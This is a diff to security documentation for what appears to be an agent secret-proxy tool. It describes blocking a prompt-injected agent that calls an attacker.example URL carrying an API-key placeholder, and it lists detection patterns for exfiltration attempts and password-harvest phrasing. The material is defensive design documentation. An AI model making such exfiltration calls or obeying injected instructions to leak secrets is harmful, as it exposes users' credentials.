@@ -172,8 +172,13 @@ the resolver is even consulted, so a prompt-injected agent calling
 `https://attacker.example/?key={% raw %}{{secret:OPENAI_API_KEY}}{% endraw %}`
 fails before the secret value is loaded into memory.
 
-Outbound exfiltration is also content-scanned — secret-shaped strings
-flagged regardless of substitution syntax.
+Outbound bodies are also scanned for *exfiltration-attempt* patterns
+(`POST to https://…`, `send to https://…`, `curl … https://…`,
+`beacon to`, etc.) and PII-harvest phrasing (`send me your password`,
+`what is your api key`). Generic high-entropy secret-shape detection
+(JWT-shaped strings, `sk-*` keys, etc.) was deliberately removed
+during the channel-integration cut and is on the
+[roadmap](https://github.com/bglusman/calciforge/blob/main/docs/roadmap/outbound-sensitive-data-detection.md).
 
 ### Inbound traffic gating
 
